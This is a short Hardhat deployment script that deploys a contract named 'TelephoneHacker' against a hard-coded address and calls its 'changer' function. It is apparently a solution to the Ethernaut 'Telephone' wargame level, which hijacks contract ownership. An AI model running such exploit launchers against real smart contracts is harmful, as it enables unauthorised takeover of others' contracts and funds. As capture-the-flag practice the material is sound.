import { ethers } from "hardhat";

const main = async () => {


  const TelephoneCaller = await ethers.getContractFactory("TelephoneHacker");
  const telephoneCaller = await TelephoneCaller.deploy(
    "0xC2a3f8c476277a34928c060ddd55136e93E832A0"
  );
  await telephoneCaller.deployed();
  await telephoneCaller.changer();

};

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
